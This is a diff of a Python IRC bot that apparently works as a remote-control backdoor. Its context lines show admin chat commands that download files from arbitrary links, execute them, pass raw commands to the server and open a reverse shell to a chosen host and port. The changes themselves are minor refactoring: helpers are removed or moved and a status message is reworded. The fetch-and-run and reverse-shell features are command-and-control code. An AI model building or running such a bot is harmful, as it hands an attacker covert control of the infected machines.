@@ -157,21 +157,19 @@ def pjchan(chan): # Part then Join channel(s)
     ircsend("PART "+ chan)
     ircsend("JOIN "+ chan)
     
-def ping(): # Respond to server Pings.
-    ircsend("PONG " + nospoof)
-    
 def newnick(newnick): # Change botnick.
     ircsend("NICK "+ newnick)
 
-def sendversion(nick, ver): # Respond to VERSION request.
-    ver = software + ' ' + version + ' Download it at: ' + github
-    ircsend("NOTICE "+ nick +" :VERSION " + ver)
-    
 def sendmsg(msg, target=channel): # Sends messages to the target.
     ircsend("PRIVMSG "+ target +" :"+ msg)
 
 def sendntc(ntc, target=channel): # Sends a NOTICE to the target.
     ircsend("NOTICE "+ target +" :"+ ntc)
+    
+def sendversion(nick, ver): # Respond to VERSION request.
+    ver = " :VERSION " + software + ' ' + version + ' Download it at: ' + github
+    sendntc(ver, nick)
+    #ircsend("NOTICE "+ nick +" :VERSION " + ver)
     
 def kick(msg, usr, chan): # Kick a user from the channel.
     ircsend("KICK "+ chan + " " + usr + " :"+ msg)
@@ -248,12 +246,9 @@ def runcmd(sc):
 def setmode(flag, target=channel): # Sets given mode to nick or channel.
     ircsend("MODE "+ target +" "+ flag)
     
-def rawCommand(rc):
-    ircsend(rc)
-    
 def download(link, file):
-    url = str(link)
-    urllib.request.urlretrieve(url, str(file))
+    #url = str(link)
+    urllib.request.urlretrieve(str(link), str(file))
     sendntc(str(file) +" was successfully downloaded from "+ str(link) +"!", adminname)
 
 def execute(file):
@@ -415,7 +410,7 @@ def main():
                     if message.split(' ', 1)[1] != -1:
                         rawc = message.split(' ', 1)[1]
                         message = "Sending '" + rawc + "' to the server!"
-                        rawCommand(rawc)
+                        ircsend(rawc)
                     else:
                         message = "Could not parse. The message should be in the format of '.raw [command]' to work properly."
                     sendntc(message, adminname)
@@ -577,7 +572,7 @@ def main():
                         if target.find(' ') != -1:
                             port = target.split(' ', 1)[1]
                             target = target.split(' ')[0]
-                            message = "[*] Reverse shell connection established with " + target + ":" + port + "!"
+                            message = "[+] Reverse shell connection established with " + target + ":" + port + "!"
                             rShell(target, port)
                         else:
                             message = "Could not parse. The command should be in the format of '.rshell [target] [port]' to work properly."
@@ -598,7 +593,7 @@ def main():
                     else:
                         sendntc("Shell commands are disabled!", adminname)
                 
-                # Respond to 'exitcode' from admin.
+                # Respond to 'exitcode botnick' from admin.
                 if name.lower() == adminname.lower() and message.rstrip() == exitcode + " " + botnick:
                     sendmsg("Okay, Bye!")
                     ircsend("QUIT Killed by " + adminname)
